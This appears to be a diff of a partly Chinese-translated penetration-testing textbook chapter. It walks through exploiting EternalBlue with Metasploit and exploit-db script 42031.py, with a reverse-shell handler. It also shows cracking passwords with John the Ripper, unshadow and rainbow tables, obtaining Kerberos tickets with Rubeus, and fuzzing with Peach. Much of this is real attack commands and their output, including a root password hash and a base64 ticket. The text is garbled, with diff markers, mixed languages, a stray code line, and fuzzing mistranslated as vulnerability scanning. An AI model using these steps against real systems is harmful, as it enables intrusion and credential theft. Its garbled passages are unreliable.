 msf exploit(windows/smb/ms17_010_eternalblue)> set RHOST 192.168.86.24
+
 RHOST => 192.168.86.24
+
 msf exploit(windows/smb/ms17_010_eternalblue)> exploit
-  
+
 [* ] Started reverse TCP handler on 192.168.86.57:4444
+
 [* ] 192.168.86.24:445 - Connecting to target for exploitation.
+
 [+ ] 192.168.86.24:445 - Connection established for exploitation.
+
 [+ ] 192.168.86.24:445 - Target OS selected valid for OS indicated by SMB reply
+
 [* ] 192.168.86.24:445 - CORE raw buffer dump (51 bytes)
+
 [* ] 192.168.86.24:445 - 0x00000000 57 69 6e 64 6f 77 73 20 53 65 72 76 65 72 20 32 Windows Server 2
+
 [* ] 192.168.86.24:445 - 0x00000010 30 30 38 20 52 32 20 53 74 61 6e 64 61 72 64 20 008 R2 Standard
+
 [* ] 192.168.86.24:445 - 0x00000020 37 36 30 31 20 53 65 72 76 69 63 65 20 50 61 63 7601 Service Pac
+
 [* ] 192.168.86.24:445 - 0x00000030 6b 20 31 k 1
+
 [+ ] 192.168.86.24:445 - Target arch selected valid for arch indicated by DCE/RPC reply
+
 [* ] 192.168.86.24:445 - Trying exploit with 12 Groom Allocations.
+
 [* ] 192.168.86.24:445 - Sending all but last fragment of exploit packet
+
 [* ] 192.168.86.24:445 - Starting non-paged pool grooming
+
 [+ ] 192.168.86.24:445 - Sending SMBv2 buffers
+
 [+ ] 192.168.86.24:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
+
 [* ] 192.168.86.24:445 - Sending final SMBv2 buffers.
+
 [* ] 192.168.86.24:445 - Sending last fragment of exploit packet!
+
 [* ] 192.168.86.24:445 - Receiving response from exploit packet
+
 [+ ] 192.168.86.24:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
+
 [* ] 192.168.86.24:445 - Sending egg to corrupted connection.
+
 [* ] 192.168.86.24:445 - Triggering free of corrupted buffer.
+
 [* ] Command shell session 1 opened (192.168.86.57:4444 -> 192.168.86.24:50371) at 2023-01-09 19:52:40 -0600
+
 [+ ] 192.168.86.24:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-==
+
 [+ ] 192.168.86.24:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-==-=
+
 [+ ] 192.168.86.24:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=--=
 ```
 
--   并不是每个漏洞都像上面这个那么成功。当你搜索模块时，会得到一个排名，指示该 exploit 成功的可能性。漏洞并非总是直接可用。在某些情况下，可能存在前置依赖，需要在利用漏洞之前先满足这些条件。你可能需要多次尝试 exploit 才能成功。如果一切都很容易直接完成，那就意味着每个人都能做到，这可能导致更多的安全测试，从而进一步减少软件中的缺陷。
+并不是每个漏洞都像上面这个那么成功。当你搜索模块时，会得到一个排名，指示该 `exploit` 成功的可能性。漏洞并非总是直接可用。在某些情况下，可能存在前置依赖，需要在利用漏洞之前先满足这些条件。你可能需要多次尝试 `exploit` 才能成功。如果一切都很容易直接完成，那就意味着每个人都能做到，这可能导致更多的安全测试，从而进一步减少软件中的缺陷。
 
--   **Exploit‑DB**  
-    你可以在 `www.exploit-db.com` 搜索与漏洞关联的 exploit。例如，我们正在使用 Eternal Blue exploit，已知它在 Metasploit 中有一个对应的模块。我们可以在 `www.exploit-db.com` 搜索与 Eternal Blue 漏洞相关的模块。在 Figure 7.2 中可以看到该搜索的结果。这里列出了三个属于 Windows 相关类别的结果，它们都是可以下载并运行的概念性 Python 脚本。
+### Exploit‑DB
+
+你可以在 `www.exploit-db.com` 搜索与漏洞关联的 `exploit`。例如，我们正在使用 `Eternal Blue exploit`，已知它在 `Metasploit` 中有一个对应的模块。我们可以在 `www.exploit-db.com` 搜索与 `Eternal Blue` 漏洞相关的模块。在 `Figure 7.2` 中可以看到该搜索的结果。这里列出了三个属于 `Windows` 相关类别的结果，它们都是可以下载并运行的概念性 `Python` 脚本。
 
 ![FIGURE 7.2 Exploit‑DB search results](img/c07f002.png)
 
 **FIGURE 7.2** Exploit‑DB search results
 
--   如果你的系统已安装 Exploit‑DB 包（即拥有 `searchsploit`），你可以直接运行 `searchsploit` 完成相同的搜索。Exploit‑DB 仓库包含 exploit 代码和 shellcode，因此搜索结果不包含像网站那样的论文，只列出 exploit 代码。你不需要通过浏览器下载或查看代码，因为已经在本地下载好了。下面的代码列表展示了搜索结果。我们得到的是三个 exploit 程序的列表，但没有 shellcode 结果。这并不奇怪，因为 Eternal Blue 没有专门的 shellcode，它只是 SMB 协议实现中的一个漏洞。
+如果你的系统已安装 `Exploit‑DB` 包（即拥有 `searchsploit`），你可以直接运行 `searchsploit` 完成相同的搜索。`Exploit‑DB` 仓库包含 `exploit` 代码和 `shellcode`，因此搜索结果不包含像网站那样的论文，只列出 `exploit` 代码。你不需要通过浏览器下载或查看代码，因为已经在本地下载好了。下面的代码列表展示了搜索结果。我们得到的是三个 `exploit` 程序的列表，但没有 `shellcode` 结果。这并不奇怪，因为 `Eternal Blue` 没有专门的 `shellcode`，它只是 `SMB` 协议实现中的一个漏洞。
 
 **searchsploit 结果 for Eternal Blue**
 
 ```
 kilroy@quiche:~$ searchsploit "eternal blue"
+
  --------------------------------------- --------------------------------------
+
   Exploit Title                        |  Path
+
                                        | (/usr/share/exploitdb/)
+
  --------------------------------------- --------------------------------------
+
  Microsoft Windows Windows 7/2008 R2 (x | exploits/windows_x86-64/remote/42031.py
+
  Microsoft Windows Windows 7/8.1/2008 R | exploits/windows/remote/42315.py
+
  Microsoft Windows Windows 8/8.1/2012 R | exploits/windows_x86-64/remote/42030.py
+
  --------------------------------------- --------------------------------------
+
  Shellcodes: No Result
 ```
 
--   你可以在当前目录运行该 exploit，或将其复制到家目录后再运行，这样在执行时无需再提供 Python 脚本的完整路径。这样也方便后续修改，同时保持原始功能代码不变。下面的代码列表展示了使用 `42031.py` 对我们之前在 Metasploit 中使用的同一目标系统进行攻击的过程。命令行最后的参数是名为 `payload` 的可执行文件，它是由两段独立的可执行代码组合而成。第一段是 Python exploit 作者编写的 shellcode，末尾附带一个用于向监听系统发送连接的桩程序。
 
-**Exploit of Eternal Blue from Python Script**
 
-```
+
+你可以在当前目录运行该 exploit，或将其复制到家目录后再运行，这样在执行时无需再提供 Python 脚本的完整路径。这样也方便后续修改，同时保持原始功能代码不变。下面的代码列表展示了使用 `42031.py` 对我们之前在 Metasploit 中使用的同一目标系统进行攻击的过程。命令行最后的参数是名为 `payload` 的可执行文件，它是由两段独立的可执行代码组合而成。第一段是 Python exploit 作者编写的 shellcode，末尾附带一个用于向监听系统发送连接的桩程序。
+
+## Exploit of Eternal Blue from Python Script
+
+```bash
 root@quiche:~# python 42031.py 192.168.86.24 payload
+
  shellcode size: 1262
+
  numGroomConn: 13
+
  Target OS: Windows Server 2008 R2 Standard 7601 Service Pack 1
+
  SMB1 session setup allocate nonpaged pool success
+
  SMB1 session setup allocate nonpaged pool success
+
  good response status: INVALID_PARAMETER
+
  done
 ```
 
--   这只是攻击的一半过程。这里展示的是 exploit 成功触发漏洞并让远程服务执行提供的 shellcode。该 shellcode 是由汇编语言编写的可执行文件，包含 Meterpreter shell 以及一种方式让它回连到你配置的监听系统。因此，你也需要设置好监听。
+这只是攻击的一半过程。这里展示的是 exploit 成功触发漏洞并让远程服务执行提供的 shellcode。该 shellcode 是由汇编语言编写的可执行文件，包含 Meterpreter shell 以及一种方式让它回连到你配置的监听系统。因此，你也需要设置好监听。
 
-**Exploit Handler**
+## Exploit Handler
 
-
-
-
+```bash
 msf> use exploit/multi/handler
 msf exploit(multi/handler)> set LHOST 192.168.86.57
 LHOST => 192.168.86.57
 msf exploit(multi/handler)> set LPORT 4444
 LPORT => 4444
 msf exploit(multi/handler)> exploit
- 
 ```
-if (condVar > someVal) {console.log("xxx")}
-```
-
-
 
 一种常用的用于破解密码的工具是 John the Ripper。John 是一个强大的离线密码破解工具，这意味着它可以在从原始来源抓取的文件上工作。它拥有多种模式，可用于破解密码。第一种，如下面的代码列表中所示，被称为 `single crack mode`。`single crack mode` 从文件的不同字段中获取信息，并应用变形规则进行处理，以尝试作为密码。由于输入列表相对较小，会有大量的变形规则用于改变源文本，生成潜在密码。这被认为是 John 用于破解密码的最快模式。同时，这也是开发者建议您首先使用的模式。
 
-`John Single Crack Mode`
+## John Single Crack Mode
 
-```
+```bash
 root@quiche:~# john passwords.txt
+
 Warning: detected hash type "LM", but the string is also recognized as "NT"
+
 Use the "--format=NT" option to force loading these as that type instead
+
 Warning: detected hash type "LM", but the string is also recognized as "NT-old"
+
 Use the "--format=NT-old" option to force loading these as that type instead
+
 Using default input encoding: UTF-8
+
 Using default target encoding: CP850
+
 Loaded 8 password hashes with no different salts (LM [DES 128/128 SSE2-16])
+
 Press 'q' or Ctrl-C to abort, almost any other key for status
+
                   (SUPPORT_388945a0)
+
                   (Guest)
+
 BLANDES          (Administrator:1)
+
 KSUHCP9          (HelpAssistant:2)
- 
 ```
 
 John 还可以使用 `wordlist mode` 读取字典文件进行破解。这是一个直接的模式，接受字典文件作为输入，比较每个单词的哈希值与目标密码哈希。您可以对字典文件应用变形规则，生成单词的变体，因为人们常常使用已知单词的变体作为密码。字典文件越长，成功破解密码的机会越大。然而，字典文件越长，破解过程所需时间也越长。请记住，字典文件只能识别列表中已有的密码。如果有人使用长 passphrase 或真正随机字符，使用字典文件将无效。这意味着您需要尝试其他模式。
@@ -6329,96 +7120,133 @@ John 还可以使用 `wordlist mode` 读取字典文件进行破解。这是一�
 
 我们可以通过 `unshadow` 程序将这两个文件合并，使所有所需信息在一起，并由 `unshadow` 合并 shadow 文件和 passwd 文件的内容。下面是一次使用 captured shadow 文件和 passwd 文件运行 `unshadow` 的示例：
 
-`Using `unshadow``
+## Using `unshadow`
 
-```
+```bash
 root@quiche:~# unshadow passwd.local shadow.local
+
 root:$6$yCc28ASu$WmFwkvikDeKL4VtJgEnYcD.PXG.4UixCikBO5jBvE3JjV43nLsfpB1z57qwLh0SNo15m5JfyQWEMhLjRv4rRO.:0:0:root:/root:/bin/bash
+
 daemon:*:1:1:daemon:/usr/sbin:/usr/sin nologin
+
 bin:*:2:2:bin:/bin:/usr/sbin/nologin
+
 sys:*:3:3:sys:/dev:/usr/sbin/nologin
+
 sync:*:4:65554:sync:/bin:/bin/sync
+
 games:*:5:60:games:/usr/games:/usr/sbin/nologin
+
 man:*:6:12:man:/var/cache/man:/usr/sbin/nologin
+
 lp:*:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+
 mail:*:8:8:mail:/var/mail:/usr/sbin/nologin
+
 news:*:9:9:news:/var/spool/news:/usr/sbin/nologin
+
 uucp:*:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+
 proxy:*:13:13:proxy:/bin:/usr/sbin/nologin
+
 www-data:*:33:33:www-data:/var/www:/usr/sbin/nologin
+
 backup:*:34:34:backup:/var/backups:/usr/sbin/nologin
+
 list:*:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+
 irc:*:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+
 gnats:*:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
- 
 ```
 
 如所示，大多数用户没有密码，只有 root 用户有密码。合并两个文件后，您可以对其运行 John 以获取密码。John 会识别文件格式和使用的哈希算法。文件中的 `$6$` 前缀表示密码使用了 SHA‑512（安全哈希算法，输出长度 512 位）。其后是哈希值，John 会将其与待比对的密码进行比对。John 并不是唯一从本地文件获取密码的方法。
 
-### Rainbow Tables
+## Rainbow Tables
 
 对于每一个由 John 测试的密码，都需要计算其哈希值以进行比对。这消耗时间和计算资源。随着现代处理器的性能，所需的时间和资源并不算大，但当处理数百万单词时，微秒级的开销会累积。为了避免在检查时重复计算哈希，可以事先预计算并存储这些哈希，随后只需在索引中查找对应的哈希即可获取明文。所有耗时的工作在实际需要破解密码之前即可完成。其代价是需要存储这些预计算的哈希。
 
 Rainbow tables 是存储的预计算哈希。它们并非简单的哈希与密码的一一映射，而是以链式结构存储，以降低所需的明文存储量。在某些情况下，明文可以通过推断得到，而不必直接存储。有许多工具可以从这些表中查找密码，但首先必须获得表本身。Rainbow Crack 项目提供了一个查找密码的工具以及一个生成 rainbow table 的工具。这个生成工具并不是用于从单词列表生成哈希，而是在给定约束下生成所有可能密码的哈希。下面的代码示例展示了使用 `rtgen` 生成 rainbow table 的过程。
 
-`Using rtgen for Rainbow Tables`
+## Using `rtgen` for Rainbow Tables
 
-
-
-
-```
+```bash
 root@quiche:~# rtgen md5 loweralpha-numeric 5 8 0 3800 33554432 0
+
 rainbow table md5_loweralpha-numeric#5-8_0_3800x33554432_0.rt parameters
+
 hash algorithm:         md5
+
 hash length:            16
+
 charset name:           loweralpha-numeric
+
 charset data:           abcdefghijklmnopqrstuvwxyz0123456789
+
 charset data in hex:    61 62 63 64 65 66 67 68 69 6a 6b 6c 6d 6e 6f 70 71 72 73 74 75 76 77 78 79 7a 30 31 32 33 34 35 36 37 38 39
+
 charset length:         36
+
 plaintext length range: 5 - 8
+
 reduce offset:          0x00000000
+
 plaintext total:        2901711320064
-  
+
 sequential starting point begin from 0 (0x0000000000000000)
+
 generating…
+
 131072 of 33554432 rainbow chains generated (0 m 28.5 s)
+
 262144 of 33554432 rainbow chains generated (0 m 28.5 s)
+
 393216 of 33554432 rainbow chains generated (0 m 28.5 s)
+
 524288 of 33554432 rainbow chains generated (0 m 28.5 s)
+
 655360 of 33554432 rainbow chains generated (0 m 28.5 s)
+
 786432 of 33554432 rainbow chains generated (0 m 28.5 s)
+
 917504 of 33554432 rainbow chains generated (0 m 28.5 s)
+
 1048576 of 33554432 rainbow chains generated (0 m 28.5 s)
+
 1179648 of 33554432 rainbow chains generated (0 m 28.5 s)
+
 1310720 of 33554432 rainbow chains generated (0 m 28.5 s)
+
 1441792 of 33554432 rainbow chains generated (0 m 28.6 s)
 ```
 
-You'll notice the parameters passed into `rtgen`. The first is the hashing algorithm used. In this case, it's Message Digest 5 (MD5), a commonly used hashing algorithm. The hashing algorithm used in the rainbow table has to match the one used in the password file. If they don't match, you aren't going to find the hash or the password. The next parameter is the character set that should be used to generate the passwords. We're using lowercase letters as well as numbers. This gives us 36 possible characters in each position. That yields 36\*n* values, where *n* is the number of positions. If we were trying to generate four‑character passwords, we would have 36\*36\*36\*36 possible passwords, which is 1,679,616—nearly 2 million four‑character passwords.
+
+
+You'll notice the parameters passed into `rtgen`. The first is the hashing algorithm used. In this case, it's Message Digest 5 (MD5), a commonly used hashing algorithm. The hashing algorithm used in the rainbow table has to match the one used in the password file. If they don't match, you aren't going to find the hash or the password. The next parameter is the character set that should be used to generate the passwords. We're using lowercase letters as well as numbers. This gives us 36 possible characters in each position. That yields 36*n* values, where *n* is the number of positions. If we were trying to generate four‑character passwords, we would have 36*36*36*36 possible passwords, which is 1,679,616—nearly 2 million four‑character passwords.
 
 We need to tell `rtgen` how long we want our passwords to be. The next two values on the command line are the minimum password length and the maximum password length. For our purposes, we are generating passwords that have between five and eight characters. That means a total of 36⁵ + 36⁶ + 36⁷ + 36⁸ passwords. This gives us 2.8 * 10¹² as the number of passwords. Obviously, the more password lengths we take on, the more passwords we have to generate and the larger our output will be.
 
-The next value selects a function, internal to `rtgen`, that is used to map the hashes to plain text. This is called a *reduction function*. The next two values have to do with the rainbow chains. The first is the number of chains generated. The more chains generated, the more data is stored on disk because it means more plain text is stored. The value after that is the number of chains to generate. A rainbow table is a collection of chains, where each chain is 16 bytes. Finally, the last value relates to the ability to store a large rainbow table in multiple files. To do that, keep all the other parameters the same and change this value.
+The next value selects a function, internal to `rtgen`, that is used to map the hashes to plain text. This is called a `reduction function`. The next two values have to do with the rainbow chains. The first is the number of chains generated. The more chains generated, the more data is stored on disk because it means more plain text is stored. The value after that is the number of chains to generate. A rainbow table is a collection of chains, where each chain is 16 bytes. Finally, the last value relates to the ability to store a large rainbow table in multiple files. To do that, keep all the other parameters the same and change this value.
 
 Once we have a rainbow table, we can check the password file we have against it. You can see a run of the program `rcrack` in the next code listing. There were no results from this run because the rainbow tables that were used were very limited. To have enough in the way of rainbow tables to really crack passwords, we would need at least gigabytes, if not terabytes or more. There are two parameters here. The first is the location of the rainbow tables, which is dot (`.`) here, meaning the local directory. The second tells `rcrack` that the file being provided is a set of LAN Man hashes.
 
-**Running `rcrack` with Rainbow Tables**
+## Running `rcrack` with Rainbow Tables
 
 ```
 kilroy@quiche:~$ rcrack . -lm passwords.txt
+
 1 rainbow tables found
-  
+
 no hash found
-  
+
 result
- 
 ```
 
 One thing to note here with respect to the location of the rainbow tables is they are not actually stored in the directory from which `rcrack` is run. Instead, the rainbow tables are stored in `/usr/share/rainbowcrack` on the Kali system from which this was run. When you run `rtgen`, the table is stored in that directory because that's where the binaries are located. The current directory in this instance is the directory where `rcrack` is rather than the directory where the user is.
 
-### Kerberoasting
+## Kerberoasting
 
-*Kerberoasting* is another type of password cracking attack that relies on getting access to a network. The name is based on the fact that Active Directory authentication over a network uses a protocol called Kerberos. Kerberos, in turn, is named for the three‑headed dog of Greek mythology who guarded the gates of the Underworld to prevent those there from leaving. It was originally developed at the Massachusetts Institute of Technology (MIT) as part of Project Athena, which was also responsible for other projects like the X Window System, a graphical user interface framework for Unix‑like systems.
+`Kerberoasting` is another type of password cracking attack that relies on getting access to a network. The name is based on the fact that Active Directory authentication over a network uses a protocol called Kerberos. Kerberos, in turn, is named for the three‑headed dog of Greek mythology who guarded the gates of the Underworld to prevent those there from leaving. It was originally developed at the Massachusetts Institute of Technology (MIT) as part of Project Athena, which was also responsible for other projects like the X Window System, a graphical user interface framework for Unix‑like systems.
 
 Kerberos works in a client‑server mode. Figure 7.3 shows a diagram of how Kerberos works in different modes: client authentication to the Authentication Server (AS), client service authentication, and a client making a service request. Messages from the client and the Kerberos servers are encrypted using a key on the client side, which is effectively the user's password in cases where it relies on a user to authenticate to request services on the network. If the server decrypts using the password it knows about and doesn't get the right data out, it says the password is incorrect, so the authentication attempt fails. Kerberos is the authentication protocol that has been used in Windows Active Directory (AD) implementations since Windows 2000.
 
@@ -6428,63 +7256,102 @@ The Kerberos architecture specifies several services, which may all be on the sa
 
 **FIGURE 7.3** Kerberos authentication ¶ Source: Jeran Renz / Wikimedia Commons / CC BY 4.0.
 
-
-
--   [域控制器将票据发送给用户，而该用户受攻击者控制。票据随后被发送到服务，该服务解密票据以判断用户是否获准访问该服务。该票据位于内存中，可从中提取并离线解密（或离线破解）。  
-
--   有一系列工具可用于实施 Kerberoasting 攻击。其中之一是名为 Rubeus 的工具。下面是针对 Windows 域控制器 192.168.4.218 运行 Rubeus 的示例。此运行会提供一个拥有域认证凭据的用户名和密码。你也可以提供密码哈希（如果你手头有的话）。这将为该用户检索票据。票据可以保存到文件中，稍后再使用。如果提供正确的命令行参数，Rubeus 会为你完成存储。
+- 域控制器将票据发送给用户，而该用户受攻击者控制。票据随后被发送到服务，该服务解密票据以判断用户是否获准访问该服务。该票据位于内存中，可从中提取并离线解密（或离线破解）。
+- 有一系列工具可用于实施 Kerberoasting 攻击。其中之一是名为 `Rubeus` 的工具。下面是针对 Windows 域控制器 `192.168.4.218` 运行 `Rubeus` 的示例。此运行会提供一个拥有域认证凭据的用户名和密码。你也可以提供密码哈希（如果你手头有的话）。这将为该用户检索票据。票据可以保存到文件中，稍后再使用。如果提供正确的命令行参数，`Rubeus` 会为你完成存储。
 
 ```
 PS C:\Users\Ric Messier\Documents> .\rubeus.exe asktgt /user:bogus /password:AB4dPW223! /domain:washere.local /dc:192.168.4.218
- 
+
    ______        _
+
   (_____ \      | |
+
    _____) )_   _| |__  _____ _   _  ___
+
   |  __  /| | | |  _ \| ___ | | | |/___)
+
   | |  \ \| |_| | |_) ) ____| |_| |___ |
+
   |_|   |_|____/|____/|_____)____/(___/
- 
+
   V2.2.1
- 
+
 [*] Action: Ask TGT
- 
+
 [*] Using rc4_hmac hash: DDB5401FAB757F3323C628F1A3EAFAEA
+
 [*] Building AS-REQ (w/ preauth) for: 'washere.local\bogus'
+
 [+] TGT request successful!
+
 [*] base64(ticket.kirbi):
- 
+
 doIFAjCCBP6gAwIBBaEDAgEWooIEFzCCBBNhggQPMIIEC6ADAgEFoQ8bDVdBU0hFUkUuTE9DQUyiIjA
+
 oAMCAQKhGTAXGwZrcmJ0Z3QbDXdhc2hlcmUubG9jYWwjggPNMIIDyaADAgESoQMCAQKiggO7BIIDtxQ
+
 zVpmAiZPxIraJ6/eARcbWtAUn8Ygs7La/pBRwmSt8ZK1q4RQzm7EsfMRUlV65i3Ajink15QdGfEi+F/
+
 i0FiqWz+6XnNJaO3LSuAUf1sMxdBTzSo/QSxVnHVhV5feLUD4xCCTLbFzx5jreWlE/audRlN6VodDhk
+
 nl7VqS+YAZU6MFcPI6NmDpgAgqUzubN90ATpdrws4nidduyGGtTqTJR5gWggSPCnqbXERbBvrv/uzMm
+
 bRxHWuf5/TQYS4hsoB1YVG1B+e3hkf2pcZSkBC+ar7qu/cCQ0Pkr+VxhotTs5pVr4St8e9C5Exx4iLV
+
 Ps38F/eZIPQg1byoEzWBXsgvQHvm6Z6sPgBP1kfPuIGyhNKaHqAabIKaJUhmM3OWBznx5EDl8mN9cQB
+
 NxxGiO+GX2boUfqLbtOveDwj4dvMi0IN2cV7yHEmQK5h+F6jMOSD5i4tMtWJyau0dQY9/x99SCuyWBc
+
 bPu1InqFHI0VtMVX980td9FTpmreSNkbVscrqB24bSkjQfkUHhR/E8radcXnDHHFBmfUmUDmHI71uz8
+
 z7r49cmLqMctCwilhfoclRW1RLi4g5X+5e+a/XfYy+PfCAMON90OkVqz7166ej4LUpRC27VkK9ieYNy
+
 ICHP8PKAV5mALz5IJRKw4RP6LAlC4tUG2DO5BvMakcRefwte2+mODCEyvbgbV9043sy/a038mUZTm5R
+
 ilkki26DxXYQ4PYGpk8zia2630O3+fbHjG1lIllUnoTDGmVzMsRPH/w2yePozOR6N7Mcm+3PjgonF5w
+
 0OlK3GcVB0F1M0RpX5ABwJj8yJOsaSESu8kXUxg8jBuV0uYaqip0eo2hK+asPs0+Ka9lnPhq0ifzFNC
+
 Nr+1x/vEoLwmTfKYktHOqXtF/IqmhJKNBVCiTolQlyt9wWnb+pPD83TYOsXqxah3vlUGBXY5Wc6zlUS
+
 a7ktZR4h30rXomUX4CRDvIYsgzmNsHpE66id4fD/26MXXy4kA0YWz+q/r9f3nBbmoZPABGMMSrtBP4O
+
 s6PjQPJ68ndco2AezSnpGR7LGdxtG3YHnDYpmzvPvP7ilGYyziF3eym0BRnAnJRog/UYHV02dJS5ZPC
+
 z+wmu+jpXaCKD4ILHXG7amx66pqtamFNG6LHI2uJ1HGKldIYNdoAm4D7lmjXrdw8E0jSYAGnhYdrmC9
+
 5E/FndxYylyPslFohVSdLtcL1Ry9ANE3EHpUTZTCJglHocxMFZg8F0WpyMwHUiSqVaOB1jCB06ADAgE
+
 ooHLBIHIfYHFMIHCoIG/MIG8MIG5oBswGaADAgEXoRIEEI59qcRDkXqpizrOjPVsVLihDxsNV0FTSEV
+
 RS5MT0NBTKISMBCgAwIBAaEJMAcbBWJvZ3VzowcDBQBA4QAApREYDzIwMjEwMTEwMjIzNjIxWqYRGA8MDI
+```
+
+
+
+```
 xMDExMTA4MzYyMVqnERgPMjAyMTAxMTcyMjM2MjFaqA8bDVdBU0hFUkUuTE9DQUypIjAgoAMCAQK
+
 GTAXGwZrcmJ0Z3QbDXdhc2hlcmUubG9jYWw=
- 
+
   ServiceName           :  krbtgt/washere.local
+
   ServiceRealm          :  WASHERE.LOCAL
+
   UserName              :  bogus
+
   UserRealm             :  WASHERE.LOCAL
+
   StartTime             :  1/10/2023 3:36:21 PM
+
   EndTime               :  1/11/2023 1:36:21 AM
+
   RenewTill             :  1/17/2023 3:36:21 PM
+
   Flags                 :  name_canonicalize, pre_authent, initial, renewable, forwardable
+
   KeyType               :  rc4_hmac
+
   Base64(key)           :  jn2pxBOReqmMOs6M9WxUuA==
 ```
 
@@ -6492,28 +7359,35 @@ GTAXGwZrcmJ0Z3QbDXdhc2hlcmUubG9jYWw=
 
 ```
 PS C:\Users\Ric Messier\Documents> .\rubeus.exe kerberoast /user:bogus/domain:washere.local /dc:192.168.4.218
- 
+
    ______        _
+
   (_____ \      | |
+
    _____) )_   _| |__  _____ _   _  ___
+
   |  __  /| | | |  _ \| ___ | | | |/___)
+
   | |  \ \| |_| | |_) ) ____| |_| |___ |
+
   |_|   |_|____/|____/|_____)____/(___/
- 
+
   V2.2.1
- 
- 
+
 [*] Action: Kerberoasting
- 
+
 [*] NOTICE: AES hashes will be returned for AES-enabled accounts.
+
 [*] Use /ticket:X or /tgtdeleg to force RC4_HMAC for these accounts.
- 
+
 [*] Target User : bogus
+
 [*] Target Domain : washere.local
+
 [*] Searching path 'LDAP://192.168.4.218/DC=washere,DC=local' for Kerberoastable users
 ```
 
--   此类攻击可让你获取额外凭据，从而实现在网络内部的横向移动，即使已经在网络内部有一定立足点。这可以通过恶意软件提供远程访问实现。恶意软件在 第 8 章 “恶意软件”中有所介绍，其中包括可用于提供系统远程访问的恶意软件。你也可以通过钓鱼攻击获取用户凭据，然后使用这些凭据访问系统。请记住，要运行像 Rubeus 这样的工具，需要在系统上拥有命令行访问权限。由于初始系统上可能没有该工具，你需要编译并将其部署到目标系统上。
+-   此类攻击可让你获取额外凭据，从而实现在网络内部的横向移动，即使已经在网络内部有一定立足点。这可以通过恶意软件提供远程访问实现。恶意软件在 第 8 章 “恶意软件”中有所介绍，其中包括可用于提供系统远程访问的恶意软件。你也可以通过钓鱼攻击获取用户凭据，然后使用这些凭据访问系统。请记住，要运行像 `Rubeus` 这样的工具，需要在系统上拥有命令行访问权限。由于初始系统上可能没有该工具，你需要编译并将其部署到目标系统上。
 
 ## 客户端端漏洞
 
@@ -6525,126 +7399,186 @@ Web 浏览器是便捷的攻击向量，原因有多方面。其一是它们是�
 
 **Firefox Exploit Module in `msfconsole`**
 
+-   使用 [`Codenomicon`](https://example.org/codenomicon) 漏洞扫描工具是一种在软件中查找错误并可能导致拒绝服务攻击的技术。它是一种简写，用于描述向应用程序发送意外或损坏数据的过程，以观察该应用程序如何处理这些数据。如果应用程序处理得当，则不会发生任何有趣的情况。你可能会得到错误，或数据仅仅被丢弃。对于我们的目的，这并不十分有意思。如果应用程序处理不佳，应用程序可能会崩溃。
 
-
-
--   [使用 Codenomicon 漏洞扫描工具](https://example.org/codenomicon)是一种在软件中查找错误并可能导致拒绝服务攻击的技术。它是一种简写，用于描述向应用程序发送意外或损坏数据的过程，以观察该应用程序如何处理这些数据。如果应用程序处理得当，则不会发生任何有趣的情况。你可能会得到错误，或数据仅仅被丢弃。对于我们的目的，这并不十分有意思。如果应用程序处理不佳，应用程序可能会崩溃。
-
-这也是一种在一段时间内流行的技术，但可能已经稍微淡出了。曾经有很多进行漏洞扫描的项目，其中一些已经不存在了，或者不再维护。有些已经变成了商业工具。最早的漏洞扫描工具来自一个学术项目，名为 Codenomicon，它用于识别 DNS 和 SNMP 中的严重漏洞。此后，向应用程序发送损坏数据被认为是更严格测试软件的良好方法。如今，软件开发团队在测试这些异常情况方面做得更好，这可能解释了为什么现在没有那么多项目在进行漏洞扫描。
-
-
-
+    这也是一种在一段时间内流行的技术，但可能已经稍微淡出了。曾经有很多进行漏洞扫描的项目，其中一些已经不存在了，或者不再维护。有些已经变成了商业工具。最早的漏洞扫描工具来自一个学术项目，名为 `Codenomicon`，它用于识别 DNS 和 SNMP 中的严重漏洞。此后，向应用程序发送损坏数据被认为是更严格测试软件的良好方法。如今，软件开发团队在测试这些异常情况方面做得更好，这可能解释了为什么现在没有那么多项目在进行漏洞扫描。
 
 On top of that, `fuzzing` is hard work. It's not as simple as just running a program that goes off and finds vulnerabilities and exploits. First, even finding a vulnerability is hard. If you can find one of those, there is no guarantee it will translate to an exploit. Let's say you are going to run a fuzzer against an application. If the application crashes, what do you know? You know you crashed an application. Without a lot of monitoring and instrumentation, you don't know where in the application it crashed. You may not even know very well what message caused the crash. The weird thing about software is you may get a cumulative effect. A series of messages may cause a problem that may appear as though a single message caused the failure. Narrowing down the set of messages is hard work.
 
 Having said all that, there are some tools available that you can use for fuzzing. There is an older tool called `Sulley`, named for the fuzzy character from Monsters, Inc. (presumably because Mike didn't have the same ring), that stopped being developed and then was picked up again and updated. It's now in a state that may require a little work to get functional, but you could look at it. The one we will look at here is called `Peach` (get it? peach? fuzz?). This is a tool that can handle both network as well as file fuzzing. It takes care of the instrumentation aspect by allowing you to start up a monitor device.
 
-`Peach` uses XML as a definition language. To write a fuzzing test in Peach, you have to create a number of elements. First, you need to create a data model. This defines the data that will be sent into the application. You may have multiple data models. The data models tell Peach what parts will be manipulated to send bad data into the application. Once you have your data model(s) defined, you need to create a state model. This tells Peach how the data models will be used. The following is a simple example of creating a data model and associated state model for Peach that will fuzz an HTTP request.
+`Peach` uses XML as a definition language. To write a fuzzing test in `Peach`, you have to create a number of elements. First, you need to create a data model. This defines the data that will be sent into the application. You may have multiple data models. The data models tell `Peach` what parts will be manipulated to send bad data into the application. Once you have your data model(s) defined, you need to create a state model. This tells `Peach` how the data models will be used. The following is a simple example of creating a data model and associated state model for `Peach` that will fuzz an HTTP request.
 
-``` 
+```
 <DataModel name="HttpRequest">
+
          <String value="GET "/>
+
          <String value="/"/>
+
          <String value="HTTP/1.1\r\n"/>
+
          <String value="Host: "/>
+
          <String value="127.0.0.1"/>
+
 </DataModel>
- 
+
 <StateModel name="TheStateModel" initialState="TheState">
+
          <State name="TheState">
+
                   <Action type="output">
+
                            <DataModel ref="HttpRequest"/>
+
                   </Action>
+
          </State>
+
 </StateModel>
 ```
 
